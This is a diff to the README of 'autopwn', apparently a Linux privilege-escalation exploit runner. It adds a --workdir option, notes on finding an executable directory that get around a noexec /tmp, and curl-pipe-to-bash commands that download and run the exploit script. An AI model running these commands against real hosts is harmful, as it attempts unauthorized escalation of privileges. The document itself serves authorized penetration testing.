@@ -24,6 +24,7 @@ No installation needed — the script downloads, compiles and runs everything fr
 | `-q` / `--quiet` | Compact output |
 | `--cleanup` | Remove the workdir when finished |
 | `--no-copyfail` | Skip the `copy.fail` payload (runs third-party code — risky) |
+| `--workdir /path` | Force a specific writable+executable dir (skip auto-detect) |
 
 ### Examples
 
@@ -39,6 +40,9 @@ curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh |
 
 # Quiet + cleanup after run
 curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- -q --cleanup
+
+# Force a specific writable+executable dir
+curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- --workdir "$PWD"
 ```
 
 ## How It Works
@@ -82,7 +86,8 @@ curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh |
 
 - Every attempt is logged to `exploit.log` in the workdir.
 - A compact `[OK]/[FAIL]` summary is printed at the end with the reason (kernel range, glibc, exit code, timeout).
-- Workdir is auto-picked from a writable **and executable** location (avoids `noexec /tmp`). On `--cleanup`, it is removed.
+- Workdir is auto-picked from a writable **and executable** location (avoids `noexec /tmp`), trying `$PWD`, `$TMPDIR`, `$HOME/.cache`, `/var/tmp`, `/dev/shm`, `/tmp` — each failure is reported with its cause (not writable / noexec). On `--cleanup`, it is removed.
+- If auto-detect fails, retry with `--workdir $PWD`.
 
 ## Why It Fails on Hardened Hosts
 
